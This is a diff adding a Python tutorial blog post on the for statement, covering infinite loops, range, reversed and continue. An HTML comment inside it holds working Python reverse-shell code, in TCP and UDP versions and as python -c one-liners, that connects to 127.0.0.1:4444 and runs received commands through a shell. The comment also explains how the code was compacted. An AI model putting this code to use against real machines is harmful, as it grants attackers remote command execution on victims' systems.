@@ -1,0 +1,289 @@
+---
+layout: post
+title: "🔁 Fundamentals Of Digital Discipleship, Part XV: The For Statement"
+date: 2023-03-10 01:40:00 -0500
+categories: digital computer programming python ministry
+published: true
+---
+
+<!-- <span style="font-style:Italic;font-size:32px;">Chapter Header</span>
+
+<span style="font-style:Italic;font-size:24px;">Sub Chapter Header</span> -->
+
+
+<a href="https://docs.python.org/3/reference/compound_stmts.html#the-for-statement" style="font-weight:italic;font-size:2em;">The For Statement</a>
+
+<span style="font-size:1.6em;">The Infinite Loop</span>
+
+Generally we would use a while loop to create an infinite loop; however, so as to be thorough, I'll provide a few examples of an infinite loop using the for statement. Itertools comes in handy with its count and repeat methods.
+
+```py
+import itertools
+
+# Count up
+for i in itertools.count():
+    # Do something infinitely
+    # with available count
+    print(f"{i}", end=" ")
+
+# Countdown
+for i in itertools.count(start=10, step=-1):
+    # Do something infinitely
+    # with a negative count
+    print(f"{i}", end=" ")
+
+# Loop infinitely
+for i in itertools.repeat(None):
+    # Do something infinitely
+    print(f"{i}", end=" ")
+```
+
+There's another, somewhat unorthodox, method of creating an infinite loop with the for statement. This comes in handy with one-liners where you're trying to avoid any imports. From the command line for instance.
+
+```py
+# Unorthodox Infinite Loop
+for i in iter(int, 1):
+    # Do something infinitely
+    print(f"{i}", end=" ")
+
+# Infinite list comprehensions
+[print(_) for _ in iter(int, 1)]
+[print(_) for _ in iter(lambda:0, 1)]
+
+# Infinite list comprehensions w/ count
+[print(i) for i in itertools.count()]
+
+# Infinite list comprehensions w/ negative count
+[print(i) for i in itertools.count(step=-1)]
+[print(i) for i in itertools.count(start=10, step=-1)]
+```
+
+<!-- An advanced example, that you do not need to comprehend, might be
+
+## **Command Line**
+
+The command line requires that we invent a one line solution so we have to rethink our design a bit. This is the most succinct `persistent reverse shell` that I could come up with at the moment of this writing. The backbone of the infinite loop is this snippet: `[print(_) for _ in iter(int, 1)]`, because int() always returns 0 and the sentinel value is 1 which is never met, we have created an infinite for loop list comprehension that will work in a one-liner. 
+
+Remember that `socket()` defaults to AF_INET (IPv4) and SOCK_STREAM (TCP) so we don't need to waste space in our string importing and using those properties. We've also taken advantage of setting stderr to STDOUT which indicates that the stderr data from the application should be captured into the same file handle as stdout. This saves more space now that we don't have to append proc.stderr.read().
+
+Because sockets are `automatically closed when they are garbage-collected`, despite the fact that it is recommended to use `with` or `close()`, we could probably neglect their use in this context.
+
+# Reverse Shell
+
+```python
+from socket     import *
+from subprocess import *
+
+# @infinite
+def reverse_shell():
+    s = socket()
+    s.connect(('127.0.0.1', 4444))
+    # s = create_connection(('127.0.0.1', 4444))
+    [ 
+        s.send(
+            Popen(
+                args=str(s.recv(512), 'ascii'),
+                stdout=PIPE,stderr=STDOUT,shell=True
+            ).stdout.read()
+        ) for _ in iter(int, 1) #..iter(lambda:0, 1) also
+    ]
+    # s.close() relying on garbage collector to shorten code
+
+if __name__ == "__main__":
+    reverse_shell()
+```
+
+```python
+python -c "from socket import *;from subprocess import *;s = socket();s.connect(('127.0.0.1', 4444));[s.send(Popen(args=str(s.recv(512), 'ascii'),stdout=PIPE,stderr=STDOUT,shell=True).stdout.read()) for _ in iter(int, 1)];"
+```
+
+```python
+python -c "from socket import *;from subprocess import *;s = create_connection(('127.0.0.1', 4444));[s.send(Popen(args=str(s.recv(512), 'ascii'),stdout=PIPE,stderr=STDOUT,shell=True).stdout.read()) for _ in iter(int, 1)];"
+```
+
+# Reverse Shell (UDP)
+
+```python
+from subprocess import *
+from socket     import *
+
+@infinite
+def reverse_shell_udp():
+    ADDR = ('127.0.0.1', 4444)
+    s = socket(type=SOCK_DGRAM)
+    s.sendto(b': ', ADDR) 
+    [
+        s.sendto(
+            Popen(
+                args = str(s.recvfrom(512)[0], 'ascii'),
+                stdout = PIPE, stderr = STDOUT, shell = True
+            ).stdout.read(),
+            ADDR
+        ) for _ in iter(int, 1) 
+    ]
+    
+if __name__ == "__main__":
+    reverse_shell_udp()
+```
+
+```python
+python -c "from subprocess import *;from socket import *;ADDR = ('127.0.0.1', 4444);s = socket(type=SOCK_DGRAM); s.sendto(b': ', ADDR);[s.sendto(Popen(args = str(s.recvfrom(512)[0], 'ascii'),stdout = PIPE, stderr = STDOUT, shell = True).stdout.read(), ADDR) for _ in iter(int, 1)]"
+``` -->
+
+<span style="font-size:1.6em;">Breaking Out Of The Loop</span>
+
+Because for loops are rarely, if ever, used with an infinite condition, now is a good time to introduce the [range](https://docs.python.org/3/library/stdtypes.html#ranges) keyword. 
+
+> The range type represents an immutable sequence of numbers and is commonly used for looping a specific number of times in for loops.
+
+The [list built-in](https://docs.python.org/3/library/functions.html) helps us visualize the output from range (immutable sequence type)
+
+```py
+# [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
+# Same as list(range(0, 10))
+list(range(10))
+
+# [9, 8, 7, 6, 5, 4, 3, 2, 1, 0]
+list(range(9, -1, -1))
+
+# [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+list(range(1, 10+1))
+
+# [10, 9, 8, 7, 6, 5, 4, 3, 2, 1]
+list(range(10, 0, -1))
+```
+
+Now that we understand range a bit better, let's see how we can combine it with the for statement for something very powerful and efficient.
+
+```py
+# 0 1 2 3 4 5 6 7 8 9
+for i in range(10):
+    print(i, end=" ")
+```
+
+Here are comparisons using while. You can see how much more verbose they are by comparison to the for example. The utilization of an assignment expression with the walrus operator does give a succinct example of an equivalent while; however, nothing is so simple as the for statement for this purpose.
+
+```py
+# 0 1 2 3 4 5 6 7 8 9
+i = 0
+while True:
+    print(i, end=" ")
+    i += 1
+    if i == 10:
+        break
+
+# 0 1 2 3 4 5 6 7 8 9
+i = 0
+while i < 10:
+    print(i, end=" ")
+    i += 1
+
+# 0 1 2 3 4 5 6 7 8 9
+i = -1
+while (i := i + 1) < 10:
+    print(i, end=" ")
+```
+
+Now watch how simple it is to reverse using the for statement and the [reversed](https://docs.python.org/3/library/functions.html#reversed) keyword.
+
+```py
+# 9 8 7 6 5 4 3 2 1 0
+for i in reversed(range(10)):
+    print(i, end=" ")
+```
+
+Now let's, once again, look at all the extra work we would have to do if we decided to use a while loop for iteration.
+
+```py
+# 9 8 7 6 5 4 3 2 1 0
+i = 9
+while True:
+    print(i, end=" ")
+    if i == 0:
+        break
+
+    i -= 1
+
+# 9 8 7 6 5 4 3 2 1 0
+# same as while i > -1:
+i = 9
+while i >= 0:
+    print(i, end=" ")
+    i -= 1
+
+# 9 8 7 6 5 4 3 2 1 0
+# same as while (i := i - 1) > -1:
+i = 10
+while (i := i - 1) >= 0:
+    print(i, end=" ")
+```
+
+<span style="font-size:1.6em;">Skipping An Iteration With Continue</span>
+
+```py
+# 0 1 2 [skipped] 4 5 6 7 8 9
+for i in range(10):
+    if i == 3:
+        print("[skipped]", end=" ")
+        continue
+    
+    print(i, end=" ")
+
+# 9 8 7 6 5 4 [skipped] 2 1 0 
+for i in reversed(range(10)):
+    if i == 3:
+        print("[skipped]", end=" ")
+        continue
+    
+    print(i, end=" ")
+```
+
+By comparion, the while is much more verbose for this purpose.
+
+```py
+# 1 2 [skipped] 4 5 6 7 8 9 10
+count = 0
+while count := count + 1:
+    if count == 3:
+        print("[skipped]", end=" ")
+        continue
+
+    print(f"{count}", end=" ")
+    if count == 10:
+        break
+
+# 1 2 [skipped] 4 5 6 7 8 9 10
+count = 0
+while (count := count + 1) <= 10:
+    if count == 3:
+        print("[skipped]", end=" ")
+        continue
+
+    print(f"{count}", end=" ")
+
+# 9 8 7 6 5 4 [skipped] 2 1 0 
+count = 10
+while (count := count - 1) >= 0:
+    if count == 3:
+        print("[skipped]", end=" ")
+        continue
+
+    print(f"{count}", end=" ")
+```
+
+<script>
+    var refTagger = {
+        settings: {
+            bibleVersion: 'ESV'
+        }
+    }; 
+
+    (function(d, t) {
+        var n=d.querySelector('[nonce]');
+        refTagger.settings.nonce = n && (n.nonce||n.getAttribute('nonce'));
+        var g = d.createElement(t), s = d.getElementsByTagName(t)[0];
+        g.src = 'https://api.reftagger.com/v2/RefTagger.js';
+        g.nonce = refTagger.settings.nonce;
+        s.parentNode.insertBefore(g, s);
+    }(document, 'script'));
+</script>
